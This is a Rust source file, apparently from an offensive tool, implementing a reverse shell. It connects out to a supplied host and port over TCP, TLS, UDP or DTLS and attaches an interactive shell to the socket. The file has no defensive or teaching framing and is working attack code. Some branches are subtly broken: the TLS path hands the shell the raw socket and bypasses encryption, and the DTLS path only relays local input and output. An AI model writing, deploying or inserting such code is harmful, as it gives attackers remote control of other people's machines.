use std::io::{Result, Read, Write};
use std::net::{TcpStream, UdpSocket, SocketAddr};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use crate::input::Protocol;

pub fn shell(host: String, port: String, shell: String, proto: Protocol, cert_data: Option<Vec<u8>>, _key_data: Option<Vec<u8>>) -> Result<()> {
    match proto {
        Protocol::Tcp => {
            let sock = TcpStream::connect(format!("{}:{}", host, port))?;
            let fd = sock.as_raw_fd();
            Command::new(shell)
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()?
                .wait()?;
        }
        Protocol::Tls => {
            use std::sync::Arc;
            use rustls::{ClientConfig};
            use webpki_roots::TLS_SERVER_ROOTS;
            use crate::listener::tls::connect_tls;

            let mut root_store = rustls::RootCertStore::empty();
            root_store.extend(TLS_SERVER_ROOTS.iter().cloned());
            let config = ClientConfig::builder()
                .with_root_certificates(root_store)
                .with_no_client_auth();
            let config = Arc::new(config);
            let stream = TcpStream::connect(format!("{}:{}", host, port))?;
            let tls_stream = connect_tls(stream, config, &host)?;
            // Use the TLS stream as a pipe for the shell
            let fd = tls_stream.get_ref().as_raw_fd();
            Command::new(shell)
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()?
                .wait()?;
        }
        Protocol::Udp => {
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            sock.connect(addr)?;
            // Use UDP socket as a pipe (not secure, just for demonstration)
            let fd = sock.as_raw_fd();
            Command::new(shell)
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()?
                .wait()?;
        }
        Protocol::Dtls => {
            use udp_dtls::{Identity, Certificate};
            use crate::listener::tls::connect_dtls;
            use std::thread;
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            let identity = match cert_data.as_ref() {
                Some(cert) => Identity::from_pkcs12(cert, "").expect("Invalid PKCS#12 for DTLS (use .p12/.pfx for --cert)"),
                None => panic!("DTLS requires --cert (PKCS#12 .p12/.pfx file)"),
            };
            let peer_cert = match cert_data.as_ref() {
                Some(cert) => Certificate::from_der(cert).expect("Invalid peer cert for DTLS (use DER for --cert)"),
                None => panic!("DTLS requires --cert for peer cert (DER format)"),
            };
            use std::sync::{Arc, Mutex};
            let dtls_stream = connect_dtls(sock, addr, identity, peer_cert)?;
            let stream = Arc::new(Mutex::new(dtls_stream));
            let stream_writer = Arc::clone(&stream);
            let writer = thread::spawn(move || {
                let mut stdin = std::io::stdin();
                let mut buf = [0u8; 4096];
                loop {
                    let n = match stdin.read(&mut buf) {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    };
                    if let Ok(mut s) = stream_writer.lock() {
                        if s.write_all(&buf[..n]).is_err() {
                            break;
                        }
                    } else {
                        break;
                    }
                }
            });
            // Main thread: read from dtls_stream and write to stdout
            let mut stdout = std::io::stdout();
            let mut buf = [0u8; 4096];
            loop {
                let n = match stream.lock() {
                    Ok(mut s) => match s.read(&mut buf) {
                        Ok(0) => break,
                        Ok(n) => n,
                        Err(_) => break,
                    },
                    Err(_) => break,
                };
                if stdout.write_all(&buf[..n]).is_err() {
                    break;
                }
                let _ = stdout.flush();
            }
            let _ = writer.join();
        }
    }
    log::warn!("Shell exited");
    Ok(())
}
